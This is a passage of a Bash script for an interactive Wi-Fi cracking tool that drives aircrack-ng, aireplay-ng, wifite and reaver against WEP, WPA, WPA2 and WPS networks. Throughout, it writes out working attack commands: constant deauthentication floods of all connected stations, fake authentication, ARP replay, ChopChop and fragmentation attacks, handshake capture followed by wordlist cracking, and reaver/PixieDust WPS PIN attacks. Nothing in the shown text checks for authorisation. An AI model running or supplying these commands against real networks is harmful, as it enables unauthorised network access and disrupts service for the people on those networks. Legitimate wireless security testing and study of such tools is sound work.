		$stopMonitorMode $killMonA$killCounter
		$stopMonitorMode $killMonB1$killCounter$killMonB2
		;;

	esac

	while [ $killCounter -le $killCounterMax ]

	do
		banner
		$white
		echo ""
		echo $killMsg
		$red
		$stopMonitorMode $killMonA$killCounter
		$stopMonitorMode $killMonB1$killCounter$killMonB2

		killCounter=$(($killCounter+1))
	done

	banner
	$white

}


############################################################################
#   MONITOR MODE STUFF END   ###############################################
############################################################################





############################################################################
#   ATTACKS: GLOBAL BEGIN   ################################################
############################################################################


autoModeUsePreviousSession(){

	currentTask="autoModeUsePreviousSession"

	sessionCopyNewCaptureFiles

	case "$encryptionType" in

		"wep")
		autoModeUsePreviousSessionWEP
		;;

		"wps")
		autoModeUsePreviousSessionWPS
		;;

		"wpa")
		autoModeUsePreviousSessionWPA
		;;

		"wpa2")
		autoModeUsePreviousSessionWPA2
		;;

	esac

}


autoModeNoPreviousSession(){

	currentTask="autoModeNoPreviousSession"

	case "$encryptionType" in

		"wep")
		autoModeNoPreviousSessionWEP
		;;

		"wps")
		autoModeNoPreviousSessionWPS
		;;

		"wpa")
		autoModeNoPreviousSessionWPA
		;;

		"wpa2")
		autoModeNoPreviousSessionWPA2
		;;

	esac

}


adFileDump(){

	currentTask="adFileDump"

	case "$encryptionType" in

		"wep")
		echo ""
		echo ""

		disableChannelHopping

		$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
		#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
		#read pause

		#Working (uses session path)
		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &

		echo ""
		echo ""
		;;

		"wpa")
		sleepMessage="Preparing to Capture WPA Handshake...."
		doSleepMessage
		sleep 3

		disableChannelHopping

		$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &

		echo ""
		echo ""
		;;

		"wpa2")
		sleepMessage="Preparing to Capture WPA Handshake...."
		doSleepMessage
		sleep 3

		disableChannelHopping

		$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &

		echo ""
		echo ""
		;;

	esac

}


adFileDumpNoChannel(){

	currentTask="adFileDumpNoChannel"

	case "$encryptionType" in

		"wep")
		echo ""
		echo ""

		$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"

		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
		#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
		#read pause

		#Working (uses session path)
		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &

		echo ""
		echo ""
		;;

		"wpa")
		echo ""
		echo ""

		$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &

		#Working (uses session path)
		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &

		echo ""
		echo ""
		;;

		"wpa2")
		echo ""
		echo ""

		$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
		#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &

		#Working (uses session path)
		#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &

		echo ""
		echo ""
		;;

	esac

}


aircrackDecrypt(){

	currentTask="aircrackDecrypt"

	sessionCopyNewCaptureFiles

	case "$encryptionType" in

		"wep")
		aircrackDecryptWEP
		;;

		"wpa")
		aircrackDecryptWPA
		;;

		"wpa2")
		aircrackDecryptWPA2
		;;

	esac

}


adAPScan(){

	currentTask="adAPScan"

	echo ""
	echo ""

	#$terminal airodump-ng --channel $channel -i $interfaceMonitor &
	#$terminal airodump-ng --ignore-negative-one --channel $channel -i $interfaceMonitor &

	$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor &

	#read pause

	echo ""
	echo ""

}


adAPScanWPS(){

	currentTask="adAPScanWPS"

	echo ""
	echo ""

	$terminal airodump-ng --channel $channel -i $interfaceMonitor --wps&

	#$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&

	echo ""
	echo ""

}


adAPScanWifiteWPS(){

	currentTask="adAPScanWifiteWPS"

	echo ""
	echo ""

	$terminal $wifiteAttackWPS -c $channel -i $interfaceMonitor &

	echo ""
	echo ""

}


adAPScanWifiteWEP(){

	currentTask="adAPScanWifiteWEP"

	echo ""
	echo ""

	$terminal $wifiteAttackWEP -c $channel -i $interfaceMonitor &

	echo ""
	echo ""

}


adAPScanNoChannel(){

	currentTask="adAPScanNoChannel"

	echo ""
	echo ""
	#$terminal airodump-ng -i $interfaceMonitor &
	#$terminal airodump-ng --ignore-negative-one -i $interfaceMonitor &

	$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor &
	#read pause

	echo ""
	echo ""

}


adAPScanNoChannelWPS(){

	currentTask="adAPScanNoChannelWPS"

	echo ""
	echo ""
	$terminal airodump-ng -i $interfaceMonitor --wps&

	#$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&

	echo ""
	echo ""

}


adAPScanWifiteWPSNoChannel(){

	currentTask="adAPScanWifiteWPSNoChannel"

	echo ""
	echo ""

	$terminal $wifiteAttackWPS -i $interfaceMonitor &

	echo ""
	echo ""

}


adAPScanWifiteWEPNoChannel(){

	currentTask="adAPScanWifiteWEPNoChannel"

	echo ""
	echo ""

	$terminal $wifiteAttackWEP -i $interfaceMonitor &

	echo ""
	echo ""

}


############################################################################
#   ATTACKS: GLOBAL END   ##################################################
############################################################################





############################################################################
#   ATTACKS: WEP BEGIN   ###################################################
############################################################################


autoModeNoPreviousSessionWEP(){

	currentTask="autoModeNoPreviousSessionWEP"

	adAPScanNoChannel

	sleepMessage="Setting Up User Input...."
	doSleepMessage
	sleep 2

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	sleepMessage="Killing airodump-ng Sessions...."
	doSleepMessage
	sleep 2

	killAirodump
	killWifite

	sleepMessage="Preparing Client Association...."
	doSleepMessage
	sleep 2

	arAssociate
	#sleep 10
	#killAireplay

	sleepMessage="Preparing airodump-ng Session...."
	doSleepMessage
	sleep 2

	adFileDump
	menuAttacksWEP

}


autoModeUsePreviousSessionWEP(){

	currentTask="autoModeUsePreviousSessionWEP"

	sessionWriteLoadPrevious


	sleepMessage="Preparing Client Association...."
	doSleepMessage
	sleep 2

	arAssociate

	sleepMessage="Preparing airodump-ng Session...."
	doSleepMessage
	sleep 2

	adFileDump

	menuAttacksWEP

}


menuAttacksWEP(){

	currentTask="menuAttacksWEP"
	lastMenuID="menuAttacksWEP"

	sessionCopyNewCaptureFiles


	banner
	bannerStats

	echo ""
	echo "Choose an attack to perform and press ENTER (Type \"more\" to see other options):"
	echo ""
	echo ""
	echo "1) De-Auth (De-Authenticate All Stations) (0=Constant)"
	echo "2) Fake Auth (Fake Authentication with AP)"
	echo "3) Interactive Attack (Interactive Frame Selection)"
	echo "4) ARP Replay (Standard ARP Request Replay)"
	echo "5) ChopChop Atack (Decrypt WEP Packets)"
	echo "6) Fragment Attack (Generates a Valid Keystream)"
	echo "7) Caffe-Latte Attack (Query Client for New IV's)"
	echo "8) C-Frag (Fragments Against a Client)"
	echo "9) MigMode (Attacks WPA Migration Mode)"
	echo ""
	echo "R) Re-Associate (Associate with Client)"
	echo "N) Start New Capture (Log to a new CAP file)"
	echo "T) Test (Tests Injection and Quality)"
	echo ""
	echo "C) Run Aircrack (Crack WEP Key) **If decryption fails, press ENTER from aircrack to return here**"
	echo ""

	read getAttackWEP

	case "$getAttackWEP" in

		"")
		menuAttacksWEP
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		"C" | "c")
		aircrackDecrypt
		;;

		"R" | "r")
		arAssociate
		;;

		"T" | "t")
		arAttackTest
		;;

		"N" | "n")
		killAirodump
		killAireplay
		adFileDump
		;;

		"0")
		arAttackDeAuthConstant
		;;

		"1")
		arAttackDeAuth
		;;

		"2")
		arAttackFakeAuth
		;;

		"3")
		arAttackInteractive
		;;

		"4")
		arAttackArpReplay
		;;

		"5")
		arAttackChopChop
		;;

		"6")
		arAttackFragment
		;;

		"7")
		arAttackCaffeLatte
		;;

		"8")
		arAttackCfrag
		;;

		"9")
		arAttackMigMode
		;;

		"more")
		banner
		bannerStats

		echo ""
		echo "Choose an option and press ENTER:"
		echo ""
		echo ""
		echo "1) TCP Dump"
		echo ""
		echo "2) Generate ARP Packet"
		echo ""
		echo "3) Forge ARP Request"
		echo ""
		echo "4) Replay Forged ARP Request"
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo "R) Return To Previous Page"
		echo ""
		echo ""
		
		read getMore

		case "$getMore" in

			"")
			menuAttacksWEP
			;;

			"1")
			# Needs .cap as INPUT
			#tcpDump ""
			tcpDump "$initPath/$bssid-arp.cap"
			;;

			"2")
			generateArpPacket
			;;

			"3")
			# Needs .xor as INPUT
			#forgeArpRequest ""
			getXorFile=$(ls | grep xor | grep $essid)
			forgeArpRequest "$getXorFile" "$initPath/$bssid-arp.cap"
			;;

			"4")
			# Needs .cap as INPUT (Using Default From forgeArpRequest)
			replayArpRequest
			;;

			"M" | "m")
			killAll
			stopMonitorMode
			menuMain
			;;

			"A" | "a")
			menuAdvanced
			;;

			"S" | "s")
			menuSessionSave
			;;

			"L" | "l")
			menuSessionLoad
			;;

			"U" | "u")
			menuUpdate
			;;

			"H" | "h")
			menuHelp
			;;

			"E" | "e")
			menuExtras
			;;

			"X" | "x")
			killAll
			stopMonitorMode
			bannerExit
			;;

			"R" | "r")
			menuAttacksWEP
			;;

		esac
		;;
		

		*)
		menuAttacksWEP
		;;

	esac

	menuAttacksWEP

}


menuAttacksWEPWifiteAuto(){

	currentTask="menuAttacksWEPWifiteAuto"
	lastMenuID="menuAttacksWEPWifiteAuto"

	killAll

	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 5000 &
	$terminal $wifiteAttackWEP -wepsave "$initPath" -wepca 5000 &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	sessionCopyNewCaptureFiles

	killAll
	menuAuto

}


arAssociate(){

	currentTask="arAssociate"

	echo ""
	echo ""

	$terminal aireplay-ng -1 6000 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &

	echo ""
	echo ""

}


arAttackDeAuth(){

	currentTask="arAttackDeAuth"

	retryDeauth="0"

	sleepMessage="Preparing to De-Authenticate All Connected Stations...."
	doSleepMessage
	sleep 2

	$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &

	sleepMessage="De-Authenticating All Connected Stations...."
	doSleepMessage
	sleep 5

}


arAttackDeAuthConstant(){

	currentTask="arAttackDeAuthConstant"

	retryDeauth="0"

	sleepMessage="De-Authenticating All Connected Stations...."
	doSleepMessage
	sleep 2

	$terminal aireplay-ng --deauth 0 -a $bssid $interfaceMonitor &

}


arAttackFakeAuth(){

	currentTask="arAttackFakeAuth"

	#$terminal aireplay-ng -1 1 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
	$terminal aireplay-ng -1 0 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
	
	# Alt
	#$terminal aireplay-ng -1 6000 -o 1 -q 10 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &

}


arAttackInteractive(){

	currentTask="arAttackInteractive"

	$terminal aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -a $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackArpReplay(){

	currentTask="arAttackArpReplay"

	$terminal aireplay-ng -3 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackChopChop(){

	currentTask="arAttackChopChop"

	#$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
	$terminal aireplay-ng -4 -h $macAddressMonitor -b $bssid $interfaceMonitor &
	
	# Unauthenticated Method
	#$terminal aireplay-ng -4 -b $bssid $interfaceMonitor &

}


arAttackFragment(){

	currentTask="arAttackFragment"

	$terminal aireplay-ng -5 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackCaffeLatte(){

	currentTask="arAttackCaffeLatte"

	$terminal aireplay-ng -6 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackCfrag(){

	currentTask="arAttackCfrag"

	$terminal aireplay-ng -7 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackMigMode(){

	currentTask="arAttackMigMode"

	$terminal aireplay-ng -8 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackTest(){

	currentTask="arAttackTest"

	$terminal aireplay-ng -9 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &

}

aircrackDecryptWEP(){

	currentTask="aircrackDecryptWEP"

	banner
	bannerStats

	echo ""
	echo "Preparing capture files for aircrack-ng...."
	echo ""
	echo ""

	findCaptureFiles

	#echo "$listCap"
	#echo "$listIvs"
	#read pause

	killAircrack

	aircrack-ng -a $acMode -e "$essid" -b $bssid -l "key_$essid" $listCap $listIvs&
	#aircrack-ng -e "$essid" -b $bssid -l "key_$essid" *.cap *.ivs&
	#aircrack-ng -l "key_$essid" *.cap *.ivs&
	#'aircrack-ng' " -l" "$capturePath/$encryptionType/key_$essid" "$capturePath/$encryptionType/*.cap" "$capturePath/$encryptionType/*.ivs"&

	# Killing aircrack-ng to stop auto-checking from overlapping WEP Attack menu
	killAircrack

	#echo ""
	#echo ""
	#echo ""
	#echo "FOUND KEY: "
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to return to Attacks Menu...."
	echo ""
	echo ""

	read acPause

	menuAttacksWEP

}


############################################################################
#   ATTACKS: WEP END   #####################################################
############################################################################





############################################################################
#   ATTACKS: WPA BEGIN   ###################################################
############################################################################


autoModeNoPreviousSessionWPA(){

	currentTask="autoModeNoPreviousSessionWPA"

	adAPScanNoChannel

	sleepMessage="Setting Up User Input...."
	doSleepMessage
	sleep 2

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	sleepMessage="Killing Airodump Window...."
	doSleepMessage
	sleep 2


	killAirodump


	menuAttacksWPA

	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


autoModeUsePreviousSessionWPA(){

	currentTask="autoModeUsePreviousSessionWPA"

	sessionWriteLoadPrevious

	menuAttacksWPA


	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


menuAttacksWPA(){

	currentTask="menuAttacksWPA"

	banner
	bannerStats

	# Only run a deauth with default text and settings if not re-forced through menu
	case "$retryDeauth" in

		"0")
		killAll

		adFileDump

		sleepMessage="Preparing to Capture WPA Handshake...."
		doSleepMessage
		sleep 2

		arAttackDeAuth
		captureHandshakeWPA
		;;

		"1")
		sleepMessage="Preparing to De-Authenticate All Connected Stations...."
		doSleepMessage
		sleep 1
		arAttackDeAuth
		captureHandshakeWPA
		;;
	esac

}


aircrackDecryptWPA(){

	currentTask="aircrackDecryptWPA"
	lastMenuID="aircrackDecryptWPA"

	banner
	bannerStats


	sleepMessage="Preparing captured handshake for aircrack-ng...."
	doSleepMessage
	sleep 4

	banner
	bannerStats

	echo ""
	echo "You need a wordlist to crack the key!"
	echo ""
	echo "Current List Loaded:"
	echo ""
	$green
	echo "$wordlist"
	$white
	echo ""
	echo "You may press C and ENTER to load a custom list"
	echo ""
	echo ""
	echo "Another Example Wordlist Collection:"
	echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
	echo ""
	echo ""
	echo "You may also press B and ENTER to run a besside-ng attack"
	echo ""
	echo ""
	echo "Press ENTER once you have a valid wordlist ready!"
	echo ""
	echo ""

	read tmpPause

	case "$tmpPause" in

		"")
		$terminal aircrack-ng -w "$wordlist" -b $bssid *.cap
		;;

		"C" | "c")
		getCustomList
		;;

		"B" | "b")
		bessideMain
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

	esac

	banner
	bannerStats

	#echo ""
	#echo ""
	#echo ""
	#echo "FOUND KEY: "
	echo ""
	echo "WPA Attack Is Currently Running!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	echo ""
	echo ""
	echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
	echo ""
	echo ""
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	echo ""
	echo ""

	read acPause

	case "$acPause" in

		"")
		killAll
		menuAttacksWPA
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

	esac

}


captureHandshakeWPA(){

	currentTask="captureHandshakeWPA"
	lastMenuID="captureHandshakeWPA"

	banner
	bannerStats

	echo ""
	echo "The airodump window is open. Look in top right hand corner for the handshake"
	echo ""
	echo "Once handshake is complete, you may close the airodump window."
	echo ""
	echo ""
	$green
	echo "Example: [ WPA handshake: $bssid ]"
	$white
	echo ""
	echo ""
	echo ""
	echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue once handshake is made...."
	echo ""
	echo ""

	read captureHandshake

	case "$captureHandshake" in

		"")
		killAirodump
		killAireplay

		sleepMessage="Preparing capture files for aircrack-ng...."
		doSleepMessage
		sleep 2

		aircrackDecrypt
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"D" | "d")
		retryDeauth="1"
		menuAttacksWPA
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		menuAttacksWPA
		;;

	esac

}


menuAttacksWPAWifiteAuto(){

	currentTask="menuAttacksWPAWifiteAuto"
	lastMenuID="menuAttacksWPAWifiteAuto"

	killAll

	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
	$terminal $wifiteAttackWPA &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	sessionCopyNewCaptureFiles

	killAll
	menuAuto

}


############################################################################
#   ATTACKS: WPA END   #####################################################
############################################################################





############################################################################
#   ATTACKS: WPA2 BEGIN   ##################################################
############################################################################


autoModeNoPreviousSessionWPA2(){

	currentTask="autoModeNoPreviousSessionWPA2"

	adAPScanNoChannel

	sleepMessage="Setting Up User Input...."
	doSleepMessage
	sleep 2

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	sleepMessage="Killing Airodump Window...."
	doSleepMessage
	sleep 2


	killAirodump

	menuAttacksWPA2

	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


autoModeUsePreviousSessionWPA2(){

	currentTask="autoModeUsePreviousSessionWPA2"

	sessionWriteLoadPrevious

	menuAttacksWPA2

	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


menuAttacksWPA2(){

	currentTask="menuAttacksWPA2"

	banner
	bannerStats

	# Only run a deauth with default text and settings if not re-forced through menu
	case "$retryDeauth" in

		"0")
		killAll

		adFileDump

		sleepMessage="Preparing to Capture WPA Handshake...."
		doSleepMessage
		sleep 2

		arAttackDeAuth
		captureHandshakeWPA2
		;;

		"1")
		sleepMessage="Preparing to De-Authenticate All Connected Stations...."
		doSleepMessage
		sleep 1
		arAttackDeAuth
		captureHandshakeWPA2
		;;
	esac

}


aircrackDecryptWPA2(){

	currentTask="aircrackDecryptWPA2"
	lastMenuID="aircrackDecryptWPA2"

	banner
	bannerStats


	sleepMessage="Preparing captured handshake for aircrack-ng...."
	doSleepMessage
	sleep 4

	banner
	bannerStats

	echo ""
	echo "You need a wordlist to crack the key!"
	echo ""
	echo "Current List Loaded:"
	echo ""
	$green
	echo "$wordlist"
	$white
	echo ""
	echo "You may press C and ENTER to load a custom list"
	echo ""
	echo ""
	echo "Another Example Wordlist Collection:"
	echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
	echo ""
	echo ""
	echo "You may also press B and ENTER to run a besside-ng attack"
	echo ""
	echo ""
	echo "Press ENTER once you have a valid wordlist ready!"
	echo ""
	echo ""

	read tmpPause

	case "$tmpPause" in

		"")
		$terminal aircrack-ng -w "$wordlist" -b $bssid *.cap
		;;

		"C" | "c")
		getCustomList
		;;

		"B" | "b")
		bessideMain
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

	esac

	banner
	bannerStats

	#echo ""
	#echo ""
	#echo ""
	#echo "FOUND KEY: "
	echo ""
	echo "WPA2 Attack Is Currently Running!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	echo ""
	echo ""
	echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
	echo ""
	echo ""
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	echo ""
	echo ""

	read acPause

	case "$acPause" in

		"")
		killAll
		menuAttacksWPA2
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"A" | "a")
		menuAdvanced
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

	esac

}


captureHandshakeWPA2(){

	currentTask="captureHandshakeWPA2"
	lastMenuID="captureHandshakeWPA2"

	banner
	bannerStats

	echo ""
	echo "The airodump window is open. Look in top right hand corner for the handshake"
	echo ""
	echo "Once handshake is complete, you may close the airodump window."
	echo ""
	echo ""
	$green
	echo "Example: [ WPA handshake: $bssid ]"
	$white
	echo ""
	echo ""
	echo ""
	echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue once handshake is made...."
	echo ""
	echo ""

	read captureHandshake

	case "$captureHandshake" in

		"")
		killAirodump
		killAireplay

		sleepMessage="Preparing capture files for aircrack-ng...."
		doSleepMessage
		sleep 2

		aircrackDecrypt
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"D" | "d")
		retryDeauth="1"
		menuAttacksWPA2
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		menuAttacksWPA2
		;;

	esac

}


menuAttacksWPA2WifiteAuto(){

	currentTask="menuAttacksWPA2WifiteAuto"
	lastMenuID="menuAttacksWPA2WifiteAuto"

	killAll

	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
	$terminal $wifiteAttackWPA2 &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	sessionCopyNewCaptureFiles

	killAll
	menuAuto

}


############################################################################
#   ATTACKS: WPA2 END   ####################################################
############################################################################





############################################################################
#   ATTACKS: WPS BEGIN   ###################################################
############################################################################


autoModeNoPreviousSessionWPS(){

	currentTask="autoModeNoPreviousSessionWPS"

	#adAPScanWifiteWPSNoChannel
	#adAPScanNoChannel
	adAPScanNoChannelWPS

	sleepMessage="Setting Up User Input...."
	doSleepMessage
	sleep 2

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	sleepMessage="Killing Airodump Window...."
	doSleepMessage
	sleep 2


	killAirodump
	killWifite

	getBSSIDCharOnly

	# Choose WPS Attack Method
	case "$attackMethodWPS" in

		"reaver")
		reaverSaveAllSessionFiles
		menuAttacksWPS
		;;

		"bully")
		menuBullyMain
		;;

	esac

}


autoModeUsePreviousSessionWPS(){

	currentTask="autoModeUsePreviousSessionWPS"

	sessionWriteLoadPrevious

	menuAttacksWPS

}


menuAttacksWPS(){

	currentTask="menuAttacksWPS"

	banner
	bannerStats

	# Set Default Choice
	pixieChoice="1"

	echo ""
	echo "1) Continue With PixieDust ENABLED (Recommended)"
	echo ""
	echo "2) Continue With PixieDust DISABLED"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Choose an Option and Press ENTER to continue"
	echo ""
	echo ""
	echo ""
	$cyan
	echo "If No Selection Is Made, It Will Continue Automatically Using PixieDust"
	$white
	echo ""
	echo ""
	echo "Continuing In 10 Seconds...."
	echo ""
	echo ""

	read -t 10 pixieChoice

	case "$pixieChoice" in

		"")
		#menuAttacksWPS
		pixieChoice="1"
		sleepMessage1="Preparing Reaver/PixieDust Session...."
		sleepMessage2="Launching Reaver/PixieDust Session...."
		sleepMessage3="Reaver Session Sprinkled With PixieDust Is Now Active!"
		;;

		"1")
		pixieChoice="1"
		sleepMessage1="Preparing Reaver/PixieDust Session...."
		sleepMessage2="Launching Reaver/PixieDust Session...."
		sleepMessage3="Reaver Session Sprinkled With PixieDust Is Now Active!"
		;;

		"2")
		pixieChoice="2"
		sleepMessage1="Preparing Reaver Session...."
		sleepMessage2="Launching Reaver Session...."
		sleepMessage3="Reaver Session Is Now Active!"
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		menuAttacksWPS
		;;

	esac

	sleepMessage="$sleepMessage1"
	doSleepMessage
	sleep 1

	killAirodump

	disableChannelHopping

	sleepMessage="$sleepMessage1"
	doSleepMessage
	sleep 1

	sleepMessage="$sleepMessage2"
	doSleepMessage
	sleep 2

	banner
	bannerStats

	sleepMessage="$sleepMessage3"
	$green
	doSleepMessage
	$white
	echo ""
	echo "Press CTRL+C At Any Time To Stop Current Session and Save"
	sleep 2

	case "$pixieChoice" in
	
		"1")
		#echo "PixeDust Enabled"
		#read pause
		$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
		#$reaver -i $interfaceMonitor -b $bssid -c $channel -vv
		;;
	
		"2")
		#echo "PixeDust Disabled"
		#read pause
		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber
		;;

	esac

	echo ""
	echo ""
	$green
	echo "*************************************"
	echo "Your reaver session has been saved!"
